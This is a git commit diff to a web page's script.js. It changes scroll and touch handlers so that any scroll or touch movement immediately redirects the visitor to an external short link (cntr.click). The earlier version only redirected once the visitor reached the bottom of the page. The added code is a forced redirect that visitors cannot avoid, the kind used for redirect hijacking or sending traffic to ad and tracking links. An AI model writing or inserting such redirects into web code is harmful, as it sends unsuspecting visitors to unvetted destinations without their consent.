71faad02cf17acfede8208c59793578dae173a8c
Itai192 <itailustig@gmail.com>
2021-09-08 18:07:37 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,10 +1,10 @@
 document.onscroll = function() 
 {
-    if (document.documentElement.scrollHeight - 2 <= document.documentElement.scrollTop + document.documentElement.clientHeight)
-        window.location.replace("https://cntr.click/DTaw1n5");
+    //if (document.documentElement.scrollHeight - 2 <= document.documentElement.scrollTop + document.documentElement.clientHeight)
+    window.location.replace("https://cntr.click/DTaw1n5");
 };
 document.ontouchmove = function() 
 {
-    if (document.documentElement.scrollHeight - 2 <= document.documentElement.scrollTop + window.innerHeight)
-        window.location.replace("https://cntr.click/DTaw1n5");
+    //if (document.documentElement.scrollHeight - 2 <= document.documentElement.scrollTop + window.innerHeight)
+    window.location.replace("https://cntr.click/DTaw1n5");
 };
